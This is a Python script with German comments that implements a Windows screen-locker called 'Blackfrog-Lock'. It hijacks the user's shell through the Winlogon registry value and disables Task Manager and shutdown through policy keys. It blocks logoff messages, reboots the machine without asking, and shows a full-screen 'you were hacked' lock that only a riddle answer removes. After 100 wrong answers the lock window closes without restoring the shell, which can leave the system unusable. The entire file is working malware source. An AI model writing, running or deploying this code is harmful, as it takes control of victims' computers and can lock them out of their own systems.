"""
Blackfrog‑Lock (Shell‑Hijack‑Variante)
======================================
• Erststart: trägt sich als Benutzer‑Shell ein (HKCU) und startet Windows automatisch neu.
• Nach Neustart erscheint der Vollbild‑Lock direkt vor dem Desktop.
• Richtige Antwort -> Shell wird zurück auf explorer.exe gesetzt, Explorer startet.
• Shutdown und Task-Manager sind während des Locks deaktiviert.
• Shutdown-Versuche per Windows-Systemnachricht werden blockiert.
• Alles in EINER Datei, keine externen Abhängigkeiten außer pywin32 (für GUI-Watchdog und Windows API).
"""

import os, sys, time, threading, subprocess
import tkinter as tk
from tkinter import simpledialog, messagebox
import winreg
import win32gui, win32con, win32process  # pywin32 nötig: pip install pywin32
import win32api
import win32gui_struct

# ------------- KONFIG -------------
FRAGE        = "Ich bin überall, aber man kann mich nie berühren. Was bin ich?"
ANTWORT      = "der gedanke"
MAX_VERSUCHE = 100
REG_PATH     = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
REG_NAME     = "Shell"
LOCK_FLAG    = "--lockmode"          # interner Parameter

REG_EXPLORER_POL = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
# ----------------------------------

def set_shell(value: str):
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_PATH) as key:
        winreg.SetValueEx(key, REG_NAME, 0, winreg.REG_SZ, value)

def get_shell() -> str:
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_PATH) as key:
            val, _ = winreg.QueryValueEx(key, REG_NAME)
            return val
    except FileNotFoundError:
        return "explorer.exe"

def disable_task_manager():
    try:
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_EXPLORER_POL) as key:
            winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
    except Exception as e:
        print("Fehler beim Deaktivieren Task-Manager:", e)

def enable_task_manager():
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_EXPLORER_POL, 0, winreg.KEY_SET_VALUE) as key:
            winreg.DeleteValue(key, "DisableTaskMgr")
    except FileNotFoundError:
        pass
    except Exception as e:
        print("Fehler beim Aktivieren Task-Manager:", e)

def disable_shutdown_options():
    try:
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, REG_EXPLORER_POL) as key:
            winreg.SetValueEx(key, "NoClose", 0, winreg.REG_DWORD, 1)
    except Exception as e:
        print("Fehler beim Deaktivieren von Shutdown-Optionen:", e)

def enable_shutdown_options():
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, REG_EXPLORER_POL, 0, winreg.KEY_SET_VALUE) as key:
            winreg.DeleteValue(key, "NoClose")
    except FileNotFoundError:
        pass
    except Exception as e:
        print("Fehler beim Aktivieren von Shutdown-Optionen:", e)

def install_and_reboot():
    """
    Trägt dieses Skript als Benutzer‑Shell ein und startet Windows automatisch neu.
    """
    cmd = f'"{sys.executable}" "{os.path.abspath(__file__)}" {LOCK_FLAG}'
    set_shell(cmd)
    messagebox.showinfo(
        "Installation komplett",
        "Blackfrog‑Lock wurde installiert.\n"
        "Windows wird jetzt neu gestartet, um den Sperrbildschirm zu aktivieren."
    )
    subprocess.run(["shutdown", "/r", "/t", "0"])

# ------------------ Shutdown-Blocker mittels Windows Message ------------------
def wndproc(hwnd, msg, wparam, lparam):
    if msg == win32con.WM_QUERYENDSESSION:
        # Windows versucht zu schließen (Logout/Shutdown)
        # Wenn Lock aktiv, verhindern wir shutdown (Antworten mit 0)
        return 0  # Verhindert Herunterfahren / Abmelden
    elif msg == win32con.WM_ENDSESSION:
        # Session endet - können wir ignorieren
        return 0
    return win32gui.DefWindowProc(hwnd, msg, wparam, lparam)

def create_message_window():
    wc = win32gui.WNDCLASS()
    wc.lpfnWndProc = wndproc
    wc.lpszClassName = "BlackfrogLockWindowClass"
    class_atom = win32gui.RegisterClass(wc)
    hwnd = win32gui.CreateWindow(class_atom, "BlackfrogLockWindow", 0, 0, 0, 0, 0, 0, 0, 0, None)
    return hwnd

# ------------------ LOCKSCREEN ------------------
def run_lockscreen():
    versuche = 0

    def disable_close():
        pass  # blockiert Alt-F4 / X

    def bring_to_front():
        hwnd = win32gui.FindWindow(None, "SYSTEM GESPERRT")
        if hwnd:
            win32gui.ShowWindow(hwnd, win32con.SW_SHOWMAXIMIZED)
            win32gui.SetForegroundWindow(hwnd)

    def watchdog():
        while True:
            time.sleep(1)
            try:
                hwnd = win32gui.GetForegroundWindow()
                _, pid = win32process.GetWindowThreadProcessId(hwnd)
                if pid != os.getpid():
                    bring_to_front()
            except Exception:
                pass

    def frage_stellen():
        nonlocal versuche
        antwort = simpledialog.askstring("Rätsel", FRAGE, parent=root)
        if antwort and antwort.strip().lower() == ANTWORT:
            label.config(text="✅ Richtige Antwort! System wird entsperrt …")
            # Shell auf explorer.exe zurücksetzen
            set_shell("explorer.exe")
            # Explorer starten
            subprocess.Popen("explorer.exe")
            # Taskmanager und Shutdown Optionen wieder aktivieren
            enable_task_manager()
            enable_shutdown_options()
            root.after(3000, root.destroy)
        else:
            versuche += 1
            if versuche >= MAX_VERSUCHE:
                label.config(text="❌ Zu viele falsche Versuche – Pech gehabt 😄")
                root.after(5000, root.destroy)
            else:
                label.config(
                    text=f"❌ Falsch! Versuch {versuche}/{MAX_VERSUCHE}\nNochmal versuchen …"
                )
                root.after(2000, frage_stellen)

    # Windows-Nachrichtenfenster für Shutdown-Blockade starten
    hwnd_msg = create_message_window()

    # GUI-Fenster
    root = tk.Tk()
    root.title("SYSTEM GESPERRT")
    root.attributes("-fullscreen", True)
    root.configure(bg="black")
    root.protocol("WM_DELETE_WINDOW", disable_close)

    label = tk.Label(
        root,
        text=(
            "🔒 Du wurdest GEHACKT von einem Blackfrog 🔒\n\n"
            "Beantworte das Rätsel zur Entsperrung!"
        ),
        fg="red", bg="black", font=("Arial", 28), justify="center"
    )
    label.pack(expand=True)

    disable_task_manager()
    disable_shutdown_options()

    threading.Thread(target=watchdog, daemon=True).start()
    root.after(1000, frage_stellen)
    root.mainloop()

# ------------------ HAUPTFLUSS ------------------
def main():
    # Falls Skript schon als Shell läuft → Lock anzeigen
    if LOCK_FLAG in sys.argv:
        run_lockscreen()
        return

    # Prüfen, ob bereits installiert
    current_shell = get_shell()
    my_cmd        = f'"{sys.executable}" "{os.path.abspath(__file__)}" {LOCK_FLAG}'
    if current_shell.strip().lower() == my_cmd.strip().lower():
        # Schon installiert, aber ohne --lockmode gestartet?  -> Lock zeigen
        subprocess.Popen([sys.executable, os.path.abspath(__file__), LOCK_FLAG])
        return

    # Noch nicht installiert → direkt installieren & neustarten (keine Nachfrage)
    install_and_reboot()

if __name__ == "__main__":
    main()
